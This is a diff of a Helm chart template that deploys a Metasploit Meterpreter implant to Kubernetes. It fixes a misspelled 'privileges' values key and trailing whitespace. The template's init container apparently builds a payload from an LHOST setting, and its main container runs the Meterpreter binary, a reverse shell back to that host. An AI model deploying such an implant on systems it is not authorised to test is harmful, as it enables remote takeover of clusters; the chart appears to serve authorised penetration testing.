@@ -18,17 +18,17 @@ spec:
       imagePullSecrets:
         {{- toYaml . | nindent 8 }}
     {{- end }}
-      {{- if .Values.priviliges.useServiceAccount }}
+      {{- if .Values.privileges.useServiceAccount }}
       serviceAccountName: {{ include "meterpreter.fullname" . }}
       {{ else }}
       automountServiceAccountToken: false
       {{ end }}
       securityContext:
-        {{- toYaml .Values.priviliges.podSecurityContext | nindent 8 }}
+        {{- toYaml .Values.privileges.podSecurityContext | nindent 8 }}
       initContainers:
         - name: msfvenome
           image: "{{ .Values.image.repository}}:{{ .Values.image.tag }}"
-          imagePullPolicy: {{ .Values.image.pullPolicy }}        
+          imagePullPolicy: {{ .Values.image.pullPolicy }}
           command: ["/bin/bash", "-c", "/tmp/meterpreter.sh"]
           env:
             - name: LHOST
@@ -41,23 +41,23 @@ spec:
             - name: msfvenome
               mountPath: /tmp/meterpreter.sh
               subPath: meterpreter.sh
-              
+
       containers:
         - name: {{ .Chart.Name }}
           image: gcr.io/google_containers/pause-amd64:3.0
-          imagePullPolicy: {{ .Values.image.pullPolicy }}        
+          imagePullPolicy: {{ .Values.image.pullPolicy }}
           command: ["/meterpreter/meterpreter"]
           tty: true
           stdin: true
           securityContext:
-            {{- toYaml .Values.priviliges.securityContext | nindent 12 }}
+            {{- toYaml .Values.privileges.securityContext | nindent 12 }}
 
           resources:
             {{- toYaml .Values.resources | nindent 12 }}
           volumeMounts:
             - name: meterpreter
               mountPath: /meterpreter
- 
+
       restartPolicy: Always
       volumes:
         - name: meterpreter
